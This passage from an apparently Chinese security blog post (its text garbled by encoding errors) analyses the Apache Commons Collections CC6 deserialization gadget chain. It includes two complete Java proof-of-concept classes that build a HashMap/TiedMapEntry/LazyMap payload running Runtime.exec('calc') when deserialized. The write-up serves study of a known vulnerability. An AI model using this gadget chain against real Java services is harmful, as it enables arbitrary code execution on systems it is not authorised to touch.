src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815168.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬æ‰¾å“ªé‡Œè°ƒç”¨äº† TiedMapEntry.hashCode å°±å¯ä»¥å®Œæˆåˆ©ç”¨é“¾çš„è·Ÿè¸ª</p><blockquote><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹ç»™å‡ºçš„æ€è·¯ï¼š</p><p>ysoserial ä¸­ï¼Œæ˜¯åˆ©ç”¨ java.util.HashSet#readObject åˆ° HashMap#put() åˆ° HashMap#hash(key)ï¼Œæœ€ååˆ° TiedMapEntry#hashCode()ã€‚</p><p>å®é™…ä¸Šæˆ‘å‘ç°ï¼Œåœ¨ java.util.HashMap#readobject ä¸­å°±å¯ä»¥æ‰¾åˆ° HashMap#hash() çš„è°ƒç”¨ï¼Œå»æ‰äº†æœ€å‰é¢çš„ä¸¤æ¬¡è°ƒç”¨ï¼š</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashMap</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;<br>    ...<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>    ...<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨ HashMap çš„ readObject æ–¹æ³•ä¸­ï¼Œè°ƒç”¨åˆ°äº† hash(keyï¼‰ï¼Œè€Œ hash æ–¹æ³•ä¸­ï¼Œè°ƒç”¨åˆ°äº† keyÂ·hashCode(ï¼‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ª key ç­‰äº TiedMapEntry å¯¹è±¡ï¼Œå³å¯è¿æ¥ä¸Šå‰é¢çš„åˆ†æè¿‡ç¨‹ï¼Œæ„æˆä¸€ä¸ªå®Œæ•´çš„ Gadgetã€‚</p></blockquote><h2 id="2ã€æ„é€ -POC"><a href="#2ã€æ„é€ -POC" class="headerlink" title="2ã€æ„é€  POC"></a>2ã€æ„é€  POC</h2><p>åˆæ­¥æ„é€ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//å›é¡¾ Transformer é“¾ï¼šRuntime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>                &#125;;<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª ChainedTransformerï¼Œå®ƒä¼šæŒ‰é¡ºåºæŠŠå‰ä¸€ä¸ª transformer çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ª transformer çš„è¾“å…¥ï¼Œä»è€ŒæŠŠä¸Šé¢çš„æ­¥éª¤ä¸²æˆä¸€æ¡â€œæ‰§è¡Œé“¾â€</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//åœ¨ URL DNS ä¸­åˆ†æè¿‡ï¼Œput çš„æ—¶å€™å°±ä¼šè§¦å‘ hash,hashCode</span><br>        <span class="hljs-comment">//è¿™é‡Œä¼ å…¥çš„ new ConstantTransformer(1) æ˜¯å…ˆç”¨æ— å®³ factory æ„é€ ç»“æ„ï¼Œåé¢å†é€šè¿‡åå°„æ›¿æ¢æˆæ¶æ„ factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() è°ƒç”¨ outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        <span class="hljs-comment">//è¿™é‡Œè¦æ³¨æ„ HashMap.put(key, value) ä¼šè®¡ç®— key.hashCode()</span><br>        <span class="hljs-comment">//æ‰€ä»¥å½“ key æ˜¯ TiedMapEntry æ—¶ï¼ŒTiedMapEntry.hashCode() ä¼šè§¦å‘ getValue()ï¼Œåˆä¼šé—´æ¥è°ƒç”¨ outerMap.get(&quot;key&quot;)ï¼Œå¦‚æœ outerMap çš„ factory æ˜¯æ¶æ„çš„å°±ä¼šè¢«è§¦å‘</span><br>        <span class="hljs-comment">//ä½†è¿™é‡Œæˆ‘ä»¬å…ˆä½¿ç”¨ ConstantTransformer(1) æ— å®³æ„é€ </span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//é€šè¿‡åå°„è·å– LazyMap ç±»ä¸­ç§æœ‰å­—æ®µ factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//è®¿é—®æƒé™ç½®ä¸ºå¯è®¿é—®</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ç„¶åæŠŠ outerMap çš„ factory å­—æ®µæ›¿æ¢æˆæˆ‘ä»¬ä¹‹å‰æ„é€ çš„ chainedTransformer</span><br>        <span class="hljs-comment">//è¿™æ ·å°±æŠŠåŸå…ˆæ— å®³çš„ factory æ¢æˆäº†æ¶æ„çš„ transformer é“¾</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815258.png"></p><p>ä½†æ˜¯æ‰§è¡Œåæ— äº‹å‘ç”Ÿï¼Œå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p>ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p>å‘ç°åœ¨ <font style="color:#080808;background-color:#ffffff;">if (map.containsKey(key) &#x3D;&#x3D; false) {  key çš„å€¼ä¸º â€œkeyâ€ã€ä¹Ÿå°±æ˜¯è¿™ä¸€æ­¥  TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, â€œkeyâ€);  ã€‘ï¼Œå¹¶æ²¡æœ‰å»æ‰§è¡Œ factory.transform(key)  ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815383.png"></p><p>åœ¨ <font style="color:#080808;background-color:#ffffff;">TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, â€œaaaâ€);  å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</font></p><p><font style="color:#080808;background-color:#ffffff;">å¯ä»¥çœ‹åˆ° key æ¥æºäºå®ä¾‹åŒ–æ—¶çš„ä¼ å‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815182.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815348.png"></p><p>é‡æ–°ä¿®æ”¹ POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//å›é¡¾ Transformer é“¾ï¼šRuntime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>        &#125;;<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª ChainedTransformerï¼Œå®ƒä¼šæŒ‰é¡ºåºæŠŠå‰ä¸€ä¸ª transformer çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ª transformer çš„è¾“å…¥ï¼Œä»è€ŒæŠŠä¸Šé¢çš„æ­¥éª¤ä¸²æˆä¸€æ¡â€œæ‰§è¡Œé“¾â€</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//åœ¨ URL DNS ä¸­åˆ†æè¿‡ï¼Œput çš„æ—¶å€™å°±ä¼šè§¦å‘ hash,hashCode</span><br>        <span class="hljs-comment">//è¿™é‡Œä¼ å…¥çš„ new ConstantTransformer(1) æ˜¯å…ˆç”¨æ— å®³ factory æ„é€ ç»“æ„ï¼Œåé¢å†é€šè¿‡åå°„æ›¿æ¢æˆæ¶æ„ factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() è°ƒç”¨ outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//è¿™é‡Œè¦æ³¨æ„ HashMap.put(key, value) ä¼šè®¡ç®— key.hashCode()</span><br>        <span class="hljs-comment">//æ‰€ä»¥å½“ key æ˜¯ TiedMapEntry æ—¶ï¼ŒTiedMapEntry.hashCode() ä¼šè§¦å‘ getValue()ï¼Œåˆä¼šé—´æ¥è°ƒç”¨ outerMap.get(&quot;key&quot;)ï¼Œå¦‚æœ outerMap çš„ factory æ˜¯æ¶æ„çš„å°±ä¼šè¢«è§¦å‘</span><br>        <span class="hljs-comment">//ä½†è¿™é‡Œæˆ‘ä»¬å…ˆä½¿ç”¨ ConstantTransformer(1) æ— å®³æ„é€ </span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//å°† &quot;key&quot; ç§»é™¤</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//é€šè¿‡åå°„è·å– LazyMap ç±»ä¸­ç§æœ‰å­—æ®µ factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//è®¿é—®æƒé™ç½®ä¸ºå¯è®¿é—®</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ç„¶åæŠŠ outerMap çš„ factory å­—æ®µæ›¿æ¢æˆæˆ‘ä»¬ä¹‹å‰æ„é€ çš„ chainedTransformer</span><br>        <span class="hljs-comment">//è¿™æ ·å°±æŠŠåŸå…ˆæ— å®³çš„ factory æ¢æˆäº†æ¶æ„çš„ transformer é“¾</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815493.png"></p><h2 id="3ã€æ€»ç»“"><a href="#3ã€æ€»ç»“" class="headerlink" title="3ã€æ€»ç»“"></a>3ã€æ€»ç»“</h2><p> åˆ©ç”¨ <code>LazyMap</code> åœ¨å–å€¼æ—¶ä¼šè°ƒç”¨å…¶ <code>factory.transform()</code>ï¼Œå†å€ŸåŠ© <code>TiedMapEntry</code> ä½œä¸º <code>HashMap</code> çš„ keyï¼Œåœ¨ååºåˆ—åŒ–æ—¶ <code>HashMap.readObject()</code> ä¼šè§¦å‘ key çš„ <code>hashCode()</code> â†’ <code>TiedMapEntry.getValue()</code> â†’ <code>LazyMap.get()</code> â†’ æ¶æ„çš„ <code>ChainedTransformer</code>ï¼Œæœ€ç»ˆæ‰§è¡Œä»»æ„æ–¹æ³•ï¼ˆå¦‚ <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼‰  </p><p>åˆ©ç”¨é“¾ï¼š</p><p>HashMap.readObject</p><p>HashMap.hash</p><p>TiedMapEntry.hashCode</p><p>TiedMapEntry.getValue.<font style="color:#080808;background-color:#ffffff;">get</font></p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311816402.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
